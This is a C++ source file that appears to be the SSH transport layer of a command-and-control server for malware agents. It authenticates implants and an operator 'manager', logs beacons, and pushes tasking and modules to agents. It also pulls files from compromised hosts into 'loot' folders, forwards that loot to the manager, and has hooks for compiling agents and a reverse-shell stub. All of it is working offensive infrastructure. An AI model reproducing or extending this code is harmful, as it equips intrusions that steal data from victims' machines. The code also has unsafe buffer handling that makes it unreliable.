#include "ssh_transport.h"


Ssh_Transport::Ssh_Transport(class ConnectionInstance *instance)
{
    this->instance = instance;
    this->logger = instance->get_logger();
    this->data = instance->get_data();
}

Ssh_Transport::~Ssh_Transport()
{
    ssh_bind_free(this->sshbind);
    ssh_finalize();
}

int Ssh_Transport::determine_handler(){
    ssh_message message;
    int rc = 0;
    int msgType = REQ_NONE;
    char buf[4096];
    char beacon[BUFSIZ];
    char tmp_buffer[3];
    char *tasking;
    char logbuff[BUFSIZ];
    memset(logbuff, 0, sizeof(logbuff));
    memset(tmp_buffer, 0, 3);
    
    do {
		//printf("entered message loop\n");
        message = ssh_message_get(this->session);
        if(message){
            switch(ssh_message_type(message)){
                case SSH_REQUEST_CHANNEL_OPEN:
                    sprintf(logbuff, "Client %s: Got request for opening channel\n", this->data->id); 
                    this->logger->log(logbuff);
                    if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                        this->channel=ssh_message_channel_request_open_reply_accept(message);
                        break;
                    }
                default:
                    ssh_message_reply_default(message);
            }
            ssh_message_free(message);
        }
    } while(message && !this->channel);
    
	if(!this->channel){
        sprintf(logbuff, "Client %s: Channel error : %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        ssh_finalize();
        return 1;
    }
    
	do {
        message=ssh_message_get(this->session);
        if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
           ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
				printf("Client %s: Got tasking request\n", this->data->id);
                msgType = REQ_TASKING;
                ssh_message_channel_request_reply_success(message);
                break;
        }
        ssh_message_free(message);
    } while (message);
    
    
    switch (msgType)
    {
    case REQ_TASKING:
        ssh_channel_read(this->channel, tmp_buffer, 2, 0);
            
        if(tmp_buffer[0] == '0'){
            ssh_channel_write(this->channel, "ok", 2);
        
            sprintf(logbuff, "Manager %s: Caught manager connection\n", this->data->id);
            this->logger->log(logbuff);

            return MANAG_TYPE;

        } else {
            // Check if ID exists
            memset(buf, 0, sizeof(buf));
            strcat(buf, "agents/");
            int exists = misc_directory_exists(strcat(buf, this->data->id));
        
            if(!exists){
                AgentInformationHandler::init(this->data->id);
                sprintf(logbuff, "Client %s: Initialized agent\n", this->data->id);
                this->logger->log(logbuff);
            }
            rc = ssh_channel_write(this->channel, "ok", 3);
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: caught ssh error: %s", this->data->id, ssh_get_error(this->session));
                this->logger->log(logbuff);
                break;
            }

            rc = ssh_channel_read(this->channel, beacon, sizeof(beacon), 0);
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: caught ssh error: %s", this->data->id, ssh_get_error(this->session));
                this->logger->log(logbuff);
                break;
            }
            AgentInformationHandler::write_beacon(this->data->id, beacon);

            tasking = AgentInformationHandler::get_tasking(this->data->id);
            if(!tasking){
                sprintf(logbuff, "Client %s: caught ssh error\n", this->data->id);
                this->logger->log(logbuff);
                perror("Reason");
                break;
            }
            printf("Tasking being sent: %s\n", tasking);
            // Write tasking
            rc = ssh_channel_write(this->channel, tasking, strlen(tasking));
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: Failed to write to channel: %s", this->data->id, ssh_get_error(this->session));
                this->logger->log(logbuff);
                break;
            }
            // Pass to handler
            return AGENT_TYPE;
        
        }
        
        break;
    default:
        sprintf(logbuff, "Client %s: got unknown message type: %d\n", this->data->id, msgType);
        this->logger->log(logbuff);
        break;
    }

    printf("Closing channels...\n");
    ssh_message_free(message);
    ssh_finalize();
	
    return -1;
}

/*Uploads a file to some connected entity*/
int Ssh_Transport::upload_file(char *ptr, int is_module){
    char buff[BUFSIZ];
    char directory[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbuffer[8];
    char *file_data;
    char *enc_data;
    int size = 0;
    int size_e = 0;
    int rc = 0;

    
    memset(buff, 0, sizeof(buff));
    memset(directory, 0, sizeof(directory));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    memset(logbuff, 0, sizeof(logbuff));
    sprintf(logbuff, "Client %s: Sending file -> %s\n", this->data->id, ptr);
    this->logger->log(logbuff);
    
    // get filesize 
    sprintf(buff, "%s/%s", getcwd(directory, sizeof(directory)), ptr);
    size = misc_get_file(buff, &file_data);
        
    if(size < 0){
        sprintf(logbuff,"Client %s: filename '%s' does not exist\n", this->data->id, buff); 
        this->logger->log(logbuff);
    
        rc = ssh_channel_write(this->channel, "er", 3);
        if(rc == SSH_ERROR){
            sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", this->data->id, ssh_get_error(this->session));
            this->logger->log(logbuff);
        }
        return 2;
    }
    
    size_e = B64::enc_size(size);
    sprintf(tmpbuffer, "%d", size_e);
        
    // writes file size
    rc = ssh_channel_write(this->channel, tmpbuffer, sizeof(tmpbuffer));
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }
    
    rc = ssh_channel_read(this->channel, buff, sizeof(buff), 0);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Client %s: Failed to read data to channel: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }
        
     B64::encode((unsigned char *)file_data, size, &enc_data);
        
    // writes file 
    rc = ssh_channel_write(this->channel, enc_data, size_e);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }
    memset(tmpbuffer, 0, 8);
    
    rc = ssh_channel_read(this->channel, tmpbuffer, 8, 0);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }

    
    if(is_module){
        sprintf(logbuff, "Client %s: Execution of module ended with exit code %s\n", this->data->id, tmpbuffer);
        this->logger->log(logbuff);
    }
    free(file_data);
    free(enc_data);

    return 0;
}

/*Downloads file from connected entity*/
int Ssh_Transport::download_file(char *ptr, int is_manager, char *extra){
    int rc = 0;
    size_t size = 0;
    size_t size_e = 0;
    const char *data_ptr;
    unsigned char *enc_ptr;
    char buff[BUFSIZ*2];
    char tmpbuffer[256];
    char logbuff[BUFSIZ];
    FILE *file;


    rc = ssh_channel_write(this->channel, "ok", 3);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "%s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }

    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    rc = ssh_channel_read(this->channel, tmpbuffer, sizeof(tmpbuffer), 0);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "%s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }

    size = atoi(tmpbuffer);
    data_ptr = (const char *)malloc(size+1);
    memset((void*)data_ptr, 0, size+1);
            
    // writes file size
    rc = ssh_channel_write(this->channel, "ok", 3);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "%s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->channel));
        this->logger->log(logbuff);
        return 1;
    }
    printf("%lu\n", size);
    int tmpint = 0;
    while (tmpint < size)
    {
        rc = ssh_channel_read(this->channel, (void *)data_ptr+strlen(data_ptr), size-tmpint, 0);
        if(rc == SSH_ERROR){
            sprintf(logbuff, "%s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
            this->logger->log(logbuff);
            return 1;
        }
        tmpint += rc;
    
    }
    

    size_e = B64::dec_size(data_ptr);

    enc_ptr = (unsigned char *)malloc(size_e);
    if(!B64::decode(data_ptr, enc_ptr, size_e)){
        sprintf(logbuff,"%s: failed to decode data\n", this->data->id);
        this->logger->log(logbuff);
        free((void*)data_ptr);
        free(enc_ptr);
        rc = ssh_channel_write(this->channel, "er", 3);
        if(rc == SSH_ERROR){
            sprintf(logbuff, "%s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
            this->logger->log(logbuff);
            return 1;
        }
        return 1;
    }
    free((void*)data_ptr);
            
    // writes file 
    rc = ssh_channel_write(this->channel, "ok", 3);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "%s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }

    memset(buff, 0, sizeof(buff));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    if(is_manager){
        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
    } else {
        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), this->data->id, ptr);
    }
    printf("%s\n", buff);
    file = fopen(buff, "wb");
    if(file == NULL){
        perror("");
        return 1;
    }
    fwrite(enc_ptr, 1, size_e, file);
    fclose(file);
    free(enc_ptr);

    return 0;
}

/*Sends over all of the loot to the manager*/
int Ssh_Transport::get_loot(char *loot){
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbf[3];
    int count;
    int ctr;
    int rc;
    int size;
    int size_e;
    char *tmp_ptr;
    char *tmp_ptr2;
    DIR *dir;
    FILE *file;
    struct dirent *ent;
    
    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    memset(logbuff, 0, sizeof(logbuff));
    sprintf(logbuff, "Manager %s: Sending Loot -> %s\n", this->data->id, loot);
    this->logger->log(logbuff);
    
    count = 0;
    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), loot);
             
    if((dir = opendir(buff)) != NULL){
        while((ent =readdir(dir)) != NULL){
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                count++;
            }
        }
    }
    closedir(dir);
    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), loot);
    memset(name, 0, sizeof(name));
    sprintf(name, "%d", count);
    
    rc = ssh_channel_write(this->channel, name, strlen(name));
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }
    
    rc = ssh_channel_read(this->channel, tmpbf, 3, 0);//rd
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->channel));
        this->logger->log(logbuff);
        return 1;
    }

    if(count == 0) return 0;
    
    if ((dir = opendir(buff)) != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir (dir)) != NULL) {
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                memset(buff, 0, sizeof(buff));
                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), loot, ent->d_name);
                file = fopen(buff, "r");
                
                rc = ssh_channel_write(this->channel, ent->d_name, strlen(ent->d_name));
                if(rc == SSH_ERROR){
                    sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                    this->logger->log(logbuff);
                    return 1;
                }

                rc = ssh_channel_read(this->channel, tmpbf, 3, 0); //ok
                if(rc == SSH_ERROR){
                    sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                    this->logger->log(logbuff);
                    return 1;
                }

                if(file == NULL){
                    sprintf(logbuff, "Manager %s: Could not read loot file %s\n", this->data->id, buff);
                    this->logger->log(logbuff);
                    perror("");
                    return 2;
                } else {
                    ctr++;
                    memset(buff, 0, sizeof(buff));
                    printf("File opened successfully\n");
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    size_e = B64::enc_size(size);
                    rewind(file);
                    tmp_ptr = (char *)malloc(size);
                    memset(tmp_ptr, 0, size);
                    fread(tmp_ptr, 1, size, file);
                    B64::encode((unsigned char*)tmp_ptr, size, &tmp_ptr2);
                    free(tmp_ptr);
                    memset(buff, 0, 256);
                    sprintf(buff, "%d", size_e);
                    
                    rc = ssh_channel_write(this->channel, buff, strlen(buff));
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                        this->logger->log(logbuff);
                        return 1;
                    }

                    rc = ssh_channel_read(this->channel, tmpbf, 3, 0);//ok
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                        this->logger->log(logbuff);
                        return 1;
                    }
                    
                    rc = ssh_channel_write(this->channel, tmp_ptr2, strlen(tmp_ptr2));
                    fclose(file);
                    free(tmp_ptr2);

                    if (ctr >= count)
                    {
                        printf("Finished writing loot to channel\n");
                        
                        rc = ssh_channel_write(this->channel, "fi", 3);
                        if(rc == SSH_ERROR){
                            sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                            this->logger->log(logbuff);
                            return 1;
                        }
                        closedir(dir);
                        break;
                    }                             
                    
                    rc = ssh_channel_write(this->channel, "nx", 3);
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                        this->logger->log(logbuff);
                        return 1;
                    }
                    printf("wrote next\n");
                    
                    rc = ssh_channel_read(this->channel, tmpbf, 3, 0); //rd
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                        this->logger->log(logbuff);
                        return 1;
                    }
                    printf("Read from channel\n");
                }
            }
        }
        
    } else {
        /* could not open directory */
        perror ("");
        return 2;
    }
    return 0;
}


/*Returns information on all of the agents the server manages*/
int Ssh_Transport::get_info(char *ptr){
    int size = 0;
    int rc = 0;
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char logbuff[BUFSIZ];
    char *dat = NULL;
    char tmpbf[3];
    DIR *dir;
    FILE *file;
    struct dirent *ent;

    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    memset(logbuff, 0, sizeof(logbuff));
    if ((dir = opendir ("agents/")) != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir (dir)) != NULL) {
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..") || !strcmp(ent->d_name, "agents.dat")){
                continue;
            } else {
                memset(buff, 0, sizeof(buff));
                memset(name, 0, sizeof(name));
                sprintf(buff, "/agents/%s/info.txt", ent->d_name);
                getcwd(name, sizeof(name));
                strcat(name, buff);
                file = fopen(name, "r");
                memset(buff, 0, sizeof(buff));
                if(file == NULL){
                    sprintf(logbuff, "Manager %s: Could not get info on agent %s\n", this->data->id, ent->d_name);
                    perror("");
                    this->logger->log(logbuff);
                } else {
                    // get file size
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    printf("Size: %d\n", size);

                    // Allocate file memory 
                    dat = (char *)malloc(size);
                    memset(dat, 0, size);
                    rewind(file);
                    fread(dat, 1, size, file);
                    
                    rc = ssh_channel_write(this->channel, dat, strlen(dat));
                    free(dat);
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                        this->logger->log(logbuff);
                        return 1;
                    }
                    
                    rc = ssh_channel_read(this->channel, tmpbf, 3, 0);
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
                        this->logger->log(logbuff);
                        return 1;
                    }
                }
            }
        }
        rc = ssh_channel_write(this->channel, "fi", 2);
        if(rc == SSH_ERROR){
            sprintf(logbuff, "Manager %s: Caught channel error: %s\n", this->data->id, ssh_get_error(this->session));
            this->logger->log(logbuff);
            return 1;
        }
        closedir (dir);
    } else {
        /* could not open directory */
        sprintf(logbuff, "Manager %s: Failed to open directory: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
            
        perror ("");
        return 2;
    }
    return 0;

}

// TODO: REMOVE THIS... ITS DEAD
/*Handler for generic connection. Determines if it is manager or agent*/
/*int Ssh_Transport::handle(void* sess){
    pClientNode node = (pClientNode) sess;
    this->data = node->data;
    printf("Pointer to local data struct: %p\n", this->data);
    printf("It did a thing...\n");
    ssh_message message;
    int rc = 0;
    int msgType = REQ_NONE;
    char buf[4096];
    char beacon[BUFSIZ];
    char tmp_buffer[3];
    char *tasking;
    char logbuff[BUFSIZ];
    memset(logbuff, 0, sizeof(logbuff));
    memset(tmp_buffer, 0, 3);
    
    do {
		//printf("entered message loop\n");
        message=ssh_message_get(this->session);
        if(message){
            switch(ssh_message_type(message)){
                case SSH_REQUEST_CHANNEL_OPEN:
					sprintf(logbuff, "Client %s: Got request for opening channel\n", this->data->id); 
                    this->logger->log(logbuff);
                    if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                        this->channel=ssh_message_channel_request_open_reply_accept(message);
                        break;
                    }
                default:
                    ssh_message_reply_default(message);
            }
            ssh_message_free(message);
        }
    } while(message && !this->channel);
    
	if(!this->channel){
        sprintf(logbuff, "Client %s: Channel error : %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        ssh_finalize();
        free(this->data);
        return 1;
    }
    
	do {
        message=ssh_message_get(this->session);
        if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
           ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
				printf("Client %s: Got tasking request\n", this->data->id);
                msgType = REQ_TASKING;
                ssh_message_channel_request_reply_success(message);
                break;
        }
        ssh_message_free(message);
    } while (message);
    
    
    switch (msgType)
    {
    case REQ_TASKING:
        ssh_channel_read(this->channel, tmp_buffer, 2, 0);
            
        if(tmp_buffer[0] == '0'){
            ssh_channel_write(this->channel, "ok", 2);
        
            sprintf(logbuff, "Manager %s: Caught manager connection\n", this->data->id);
            this->logger->log(logbuff);

            return MANAG_TYPE;
        } else {
            // Check if ID exists
            memset(buf, 0, sizeof(buf));
            strcat(buf, "agents/");
            int exists = misc_directory_exists(strcat(buf, this->data->id));
        
            if(!exists){
                AgentInformationHandler::init(data->id);
                sprintf(logbuff, "Client %s: Initialized agent\n", this->data->id);
                this->logger->log(logbuff);
            }
            rc = ssh_channel_write(this->channel, "ok", 3);
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: caught ssh error: %s", this->data->id, ssh_get_error(ssh_channel_get_session(this->channel)));
                this->logger->log(logbuff);
                break;
            }

            rc = ssh_channel_read(this->channel, beacon, sizeof(beacon), 0);
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: caught ssh error: %s", this->data->id, ssh_get_error(ssh_channel_get_session(this->channel)));
                this->logger->log(logbuff);
                break;
            }
            AgentInformationHandler::write_beacon(this->data->id, beacon);

            tasking = AgentInformationHandler::get_tasking(this->data->id);
            if(!tasking){
                sprintf(logbuff, "Client %s: caught ssh error\n", this->data->id);
                this->logger->log(logbuff);
                perror("Reason");
                break;
            }
            printf("Tasking being sent: %s\n", tasking);
            // Write tasking
            rc = ssh_channel_write(this->channel, tasking, strlen(tasking));
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: Failed to write to channel: %s", this->data->id, ssh_get_error(ssh_channel_get_session(this->channel)));
                this->logger->log(logbuff);
                break;
            }
            // Pass to handler
            return AGENT_TYPE;
        }
        
        break;
    default:
        sprintf(logbuff, "Client %s: got unknown message type: %d\n", this->data->id, msgType);
        this->logger->log(logbuff);
        break;
    }

    printf("Closing channels...\n");
    ssh_message_free(message);
    ssh_finalize();
    free(this->data);
    
    return 0;
}*/

void Ssh_Transport::make_agent(char *dat_ptr, char *d_ptr){
    AgentInformationHandler::compile(dat_ptr, d_ptr);
}

int Ssh_Transport::init_reverse_shell(){
    return 0;
}

int Ssh_Transport::listen(int master_socket){
    ssh_session session;
    ssh_bind sshbind;
    int r;
    int quitting = 0;
    
    this->sshbind=ssh_bind_new();
    this->session=ssh_new();

    ssh_options_set(this->session, SSH_OPTIONS_FD, &master_socket);
	
    ssh_bind_options_set(this->sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
    ssh_bind_options_set(this->sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");

    if(ssh_bind_listen(this->sshbind)<0){
        printf("Error listening to socket: %s\n", ssh_get_error(this->sshbind));
        return 1;
    }

    // bind the listener to the port
    printf("Server: Bound to listening port\n");

    r=ssh_bind_accept(this->sshbind, this->session);
    printf("Server: Accepting connection\n");
    if(r==SSH_ERROR){
      	printf("Error accepting a connection : %s\n",ssh_get_error(this->sshbind));
        return 1;
    }
    if (ssh_handle_key_exchange(this->session)) {
        printf("ssh_handle_key_exchange: %s\n", ssh_get_error(this->session));
        return 1;
    }

    int rc = this->authenticate();
    if (rc != 0)
    {
        this->logger->log("Data Failed creation\n");
        return 1;
    }
    return 0;

}


int Ssh_Transport::authenticate(){
    // initialize variables
    int auth=0;
    char *name = NULL;
    ssh_message message;
    
    do {
        message=ssh_message_get(this->session);
        if(!message)
            break;
        switch(ssh_message_type(message)){
            case SSH_REQUEST_AUTH:
                switch(ssh_message_subtype(message)){
                    // authenticate connection
                    case SSH_AUTH_METHOD_PASSWORD:
                        if(Authenticate::doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                            auth=1;
                            name = (char*)malloc(strlen(ssh_message_auth_user(message)));
                            memset(name, 0, strlen(ssh_message_auth_user(message)));
                            sprintf(name, "%s", ssh_message_auth_user(message));
                            ssh_message_auth_reply_success(message,0);
                            break;
                       	} else {
                            auth = 2;
                            ssh_message_reply_default(message);
                            break;
                        }
                    // not authenticated, send default message
                    case SSH_AUTH_METHOD_NONE:
                    default:
                        ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
                        ssh_message_reply_default(message);
                        break;
                }
                break;
            default:
                ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    } while (!auth);
    
    // Check if the client authenticated successfully
	if(auth != 1){
        printf("Server: Terminating connection\n");
        ssh_disconnect(this->session);
        return 1;
    } else {
        this->data->id = name;
        
        return 0;
    }
    return 1;
}

int Ssh_Transport::read(char **buff, int length){
    int rc = 0;
    rc = ssh_channel_read(this->channel, *buff, length, 0);
    if (rc == SSH_ERROR)
    {
        char logbuff[BUFSIZ];
        memset(logbuff, 0, sizeof(logbuff));
        
        sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", this->data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }
    return 0;
        
}

int Ssh_Transport::send_err(){
    int rc = 0;
    rc = ssh_channel_write(this->channel, "er", 3);
    if (rc == SSH_ERROR)
    {
        char logbuff[BUFSIZ];
        memset(logbuff, 0, sizeof(logbuff));
        sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }
    return 0;
}

int Ssh_Transport::send_ok(){
    int rc = 0;
    rc = ssh_channel_write(this->channel, "ok", 3);
    if (rc == SSH_ERROR)
    {
        char logbuff[BUFSIZ];
        memset(logbuff, 0, sizeof(logbuff));
        sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", data->id, ssh_get_error(this->session));
        this->logger->log(logbuff);
        return 1;
    }
    return 0;
}

pClientDat Ssh_Transport::get_data(){
    return this->data;
}